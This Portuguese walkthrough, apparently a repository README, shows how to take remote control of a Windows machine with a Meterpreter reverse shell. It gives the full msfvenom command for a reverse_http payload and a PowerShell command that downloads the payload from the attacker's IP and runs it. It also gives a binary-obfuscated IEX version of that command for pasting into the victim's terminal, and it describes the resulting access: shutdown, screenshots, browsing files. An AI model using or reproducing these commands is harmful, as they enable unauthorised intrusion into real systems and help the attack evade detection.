Antes de tudo devemos ter informaçoes cruciais os ips das maquinas , criação do payload com msfvenom , uso do payload dentro do mf6 com exploit de shel reverso metepreter win, o dowload do arquivo e execução do rev shell na maquina win pelo o dowload.

primeiro passo 1

criar o payload com o msfvenom

comando usado :
```bash
   msfvenom -p windows/meterpreter/reverse_http LHOST=172.23.73.245 LPORT=4444 -f exe -o shell_reverso.exe
```

<img width="879" height="382" alt="image" src="https://github.com/user-attachments/assets/4e590837-a3c7-4999-a1aa-37bd45bdfd89" />


passo 2 :

abrir o msf6 e usar o payload

<img width="601" height="698" alt="image" src="https://github.com/user-attachments/assets/9abc6c9f-7af9-4f73-9bdf-c00105c3f458" />

isca pronta

passo 3:

agora vamos usar o programa obsfucator apenas para exemplo de uso.

O comando que sera mascarado será esse : iwr -Uri http://172.23.73.245/shell_reverso.exe -Outfile shell_reverso.exe; .\shell_reverso.exe

<img width="1512" height="843" alt="image" src="https://github.com/user-attachments/assets/13b5a007-e0f2-4e0d-8ca1-8a7992580691" />

Comando usado: .\obfuscator.ps1 -comand "iwr -Uri http://172.23.73.245/shell_reverso.exe -Outfile shell_reverso.exe; .\shell_reverso.exe" -type binary

ele retorna uma função com binarios que quando colada no terminal nos da o shell reverso da maquina:

<img width="1577" height="146" alt="image" src="https://github.com/user-attachments/assets/baf6362d-36fe-4262-b502-1c101e47c600" />

agora é so colar o comando 
```ps1
  function uYrp($z){$KAL="";foreach($sX in $z){$KAL+=[char][Convert]::ToInt32($sX,2)};return $KAL};IEX (uYrp(@("01101001","01110111","01110010","00100000","00101101","01010101","01110010","01101001","00100000","01101000","01110100","01110100","01110000","00111010","00101111","00101111","00110001","00110111","00110010","00101110","00110010","00110011","00101110","00110111","00110011","00101110","00110010","00110100","00110101","00101111","01110011","01101000","01100101","01101100","01101100","01011111","01110010","01100101","01110110","01100101","01110010","01110011","01101111","00101110","01100101","01111000","01100101","00100000","00101101","01001111","01110101","01110100","01100110","01101001","01101100","01100101","00100000","01110011","01101000","01100101","01101100","01101100","01011111","01110010","01100101","01110110","01100101","01110010","01110011","01101111","00101110","01100101","01111000","01100101","00111011","00100000","00101110","01011100","01110011","01101000","01100101","01101100","01101100","01011111","01110010","01100101","01110110","01100101","01110010","01110011","01101111","00101110","01100101","01111000","01100101")))
```
<img width="1581" height="174" alt="image" src="https://github.com/user-attachments/assets/2a52728f-6170-4b44-83a6-7dbcb0f44a16" />

Não temos nenhuma resposta de erro indicando que possa ter dado certo.

passo 4: checkar o msfconsole 

Checkando o msfconsole conseguimos o acesso e podemos executar comandos remotos como desligar o aparelho tirar screensshots e navegar nos arquivos.

<img width="1233" height="272" alt="image" src="https://github.com/user-attachments/assets/33eb1f44-8ccf-4c6d-901b-f62feca32ad3" />

Obrigado

